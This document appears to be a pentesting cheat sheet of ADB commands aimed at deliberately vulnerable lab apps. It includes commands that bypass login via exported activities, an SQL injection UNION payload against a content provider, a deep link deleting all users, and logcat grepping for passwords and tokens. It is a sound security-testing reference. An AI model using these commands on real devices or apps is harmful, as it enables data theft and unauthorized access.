# Android Penetration Testing — ADB Cheatsheet

A curated list of practical **Android Debug Bridge (ADB)** commands for security testing and mobile assessments.

---

## 1. Device Management & Connectivity

```bash
# List connected physical devices and running emulators
adb devices -l

# Restart ADB server with root permissions
adb root
adb remount

# Connect to device over Wi-Fi / TCP
adb tcpip 5555
adb connect 192.168.1.100:5555

# Access interactive device shell
adb shell
```

---

## 2. Package Management & Inspection

```bash
# List all installed packages
adb shell pm list packages

# Filter installed packages matching keyword
adb shell pm list packages | grep pentestlab

# Get filesystem path of APK on device
adb shell pm path com.pentestlab.insecurevault

# Pull APK from device to local directory
adb pull /data/app/~~.../com.pentestlab.insecurevault/base.apk InsecureVault.apk

# Install an APK onto device
adb install -r -d target_app.apk

# Clear application data and caches
adb shell pm clear com.pentestlab.insecurevault

# Uninstall an application
adb uninstall com.pentestlab.insecurevault
```

---

## 3. Sandboxed Application Data Auditing

```bash
# Access application private sandbox directory (debuggable apps only)
adb shell "run-as com.pentestlab.insecurevault ls -la"

# Dump SharedPreferences XML files
adb shell "run-as com.pentestlab.insecurevault cat shared_prefs/UserPrefs.xml"

# Copy private SQLite database to accessible location
adb shell "run-as com.pentestlab.insecurevault cp databases/notes.db /sdcard/notes.db"
adb pull /sdcard/notes.db .
```

---

## 4. Intent & Activity Manipulation (`am`)

```bash
# Launch default main launcher activity
adb shell am start -n com.pentestlab.insecurevault/.MainActivity

# Launch exported activity directly (bypassing login)
adb shell am start -n com.pentestlab.exposedapp/.ProfileActivity

# Launch exported admin panel directly
adb shell am start -n com.pentestlab.exposedapp/.AdminActivity

# Trigger deep links with custom parameters
adb shell am start -a android.intent.action.VIEW -d "pentestlab://action?cmd=delete&data=all_users"

# Send explicit or implicit broadcast intents with extras
adb shell am broadcast -a com.pentestlab.exposedapp.USER_DATA \
    --es username "test_user" \
    --es email "test@pentest.local"
```

---

## 5. Content Provider Exploitation (`content`)

```bash
# Query an exported content provider
adb shell content query --uri content://com.pentestlab.exposedapp.provider/users

# Query with WHERE filter
adb shell content query --uri content://com.pentestlab.exposedapp.provider/users --where "id=1"

# Exploit SQL injection in Content Provider
adb shell content query --uri content://com.pentestlab.exposedapp.provider/users \
    --where "1=1) UNION SELECT 1,sqlite_version(),sql,4,5,6 FROM sqlite_master--"

# Insert records via Content Provider
adb shell content insert --uri content://com.pentestlab.exposedapp.provider/users \
    --bind name:s:"Attacker" --bind email:s:"evil@attacker.com"
```

---

## 6. Logcat & Debugging

```bash
# Stream logs filtered by tag
adb logcat -s "AUTH" "NOTES" "LEAKYAUTH"

# Dump recent log buffer and grep for secrets
adb logcat -d | grep -iE "password|token|key|secret"

# Clear log buffer
adb logcat -c
```

---

## 7. Application Backup Extraction

```bash
# Extract full application data archive (if allowBackup="true")
adb backup -f app_backup.ab -noapk com.pentestlab.insecurevault

# Unpack android backup using Android Backup Extractor (abe.jar)
java -jar abe.jar unpack app_backup.ab app_backup.tar
tar -xvf app_backup.tar
```
